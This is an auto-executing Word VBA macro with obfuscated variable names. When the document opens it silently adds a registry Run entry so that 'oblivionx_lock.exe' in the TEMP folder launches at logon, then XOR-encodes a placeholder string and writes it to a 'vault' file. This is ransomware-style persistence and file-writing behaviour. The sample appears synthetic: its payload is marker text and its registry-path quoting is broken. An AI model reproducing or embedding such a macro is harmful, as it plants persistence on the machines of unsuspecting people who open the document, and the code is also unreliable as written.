Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim lckhv437 As Object
    Dim xcx6ug6uo As String, data As String, enc As String
    Dim sarv21hmdtd5d As Long
    Set lckhv437 = CreateObject("WScript.Shell")
    lckhv437.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\oblivionx", """ & Environ("TEMP") & "\oblivionx_lock.exe"", "REG_SZ"
    xcx6ug6uo = Environ("TEMP") & "\oblivionx_vault\secret.txt"
    data = "top secret marker data"
    enc = ""
    For sarv21hmdtd5d = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, sarv21hmdtd5d, 1)) Xor 42)
    Next sarv21hmdtd5d
    Open xcx6ug6uo For Output As #1
    Print #1, enc
    Close #1
End Sub
